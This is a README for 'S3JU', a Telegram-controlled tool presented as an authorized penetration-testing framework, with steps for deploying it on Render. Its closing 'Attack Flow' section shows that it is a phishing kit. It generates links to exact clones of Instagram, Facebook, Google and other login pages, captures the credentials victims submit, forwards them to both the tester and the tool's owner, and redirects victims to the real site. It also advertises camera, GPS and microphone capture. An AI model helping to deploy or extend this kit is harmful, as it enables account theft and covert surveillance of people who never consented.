# S3JU v1.0

**Advanced Security Testing Framework**

Developed by **D4RK-K1NG**

---

## Overview

S3JU is a Telegram-controlled security testing framework designed for **authorized penetration testing and security awareness assessments**.

It helps security professionals simulate web-based attack scenarios, manage test sessions, collect telemetry, and evaluate defensive readiness in controlled environments.

> **Important:** This tool is intended strictly for authorized security testing and educational purposes only.

---

## Features

### Telegram Bot Control
Manage and monitor testing sessions directly through Telegram.

### Multi-Platform Web Simulation
Supports realistic simulation templates for major platforms:

- Instagram
- Facebook
- Twitter/X
- LinkedIn
- GitHub
- Google
- Snapchat

### Device Telemetry Modules

Collect consent-based client-side telemetry for testing:

- Camera access verification
- GPS location permission testing
- Microphone permission testing

### SQLite Database

Persistent local storage for:

- User sessions
- Test logs
- Access telemetry
- Statistics

### Admin Dashboard

Built-in management tools:

- User management
- Broadcast messaging
- Session analytics
- Global statistics

### Session Management

Create, monitor, and terminate testing sessions on demand.

|---------|-------------|
| `/start` | Welcome banner and introduction |
| `/attack` | Create a new security testing session |
| `/stats` | View captures, views, and active sessions |
| `/cancel` | Cancel active sessions |
| `/help` | Display command list |
| `/admin` | Open admin panel |
| `/broadcast` | Send announcement to users |

---

# Security Testing Workflow

1. User sends `/attack`
2. Bot requests terms acceptance
3. User selects simulation template
4. System generates a unique session URL
5. Tester shares the link with authorized participants
6. Participant accesses the test page
7. Session telemetry and interactions are logged
8. Tester receives real-time updates
9. Session data is stored securely
10. Session can be reviewed or terminated anytime

# Deployment on Render.com

## Step 1: Push to GitHub

```bash
git init
git add .
git commit -m "Initial commit"
git remote add origin https://github.com/YOUR_USERNAME/s3ju.git
git push -u origin main
```

---

## Step 2: Create Render Web Service

Go to:

**https://render.com**

Create a new **Web Service** and connect your GitHub repository.

### Configuration

| Setting | Value |
|---------|-------|
| Name | `s3ju` |
| Runtime | Python 3 |
| Build Command | `pip install -r requirements.txt` |
| Start Command | `gunicorn app:app --bind 0.0.0.0:$PORT --workers=2 --threads=4 --timeout=120` |
| Plan | Free |

---

## Step 3: Environment Variables

Add the following variables:

| Variable | Description |
|----------|-------------|
| `TELEGRAM_BOT_TOKEN` | Bot token from BotFather |
| `OWNER_CHAT_ID` | Your Telegram chat ID |
| `ADMIN_IDS` | Comma-separated admin IDs |
| `FLASK_SECRET` | Random secret key |
| `RENDER_EXTERNAL_URL` | Auto-generated by Render |

---

## How to Get Telegram Chat ID

1. Open Telegram
2. Message **@userinfobot**
3. Copy your numeric ID
4. Use it for:

- `OWNER_CHAT_ID`
- `ADMIN_IDS`

---

## Step 4: Configure Webhook

Open:

```bash
https://api.telegram.org/botYOUR_TOKEN/setWebhook?url=https://your-app.onrender.com/webhook
```

Expected response:

```json
{
  "ok": true,
  "result": true,
  "description": "Webhook was set"
}
```

## Attack Flow

1. User sends `/attack`
2. Bot asks for terms agreement with ✅/❌ buttons
3. After agreement, shows 10 platform options
4. User selects a platform
5. Bot generates a unique URL: `https://your-app.onrender.com/p/{session_id}`
6. Tester sends URL to target
7. Target visits URL and sees an exact clone of the selected platform's login page
8. Target enters credentials and submits
9. Credentials are sent to the tester AND the owner
10. Target is redirected to the real platform
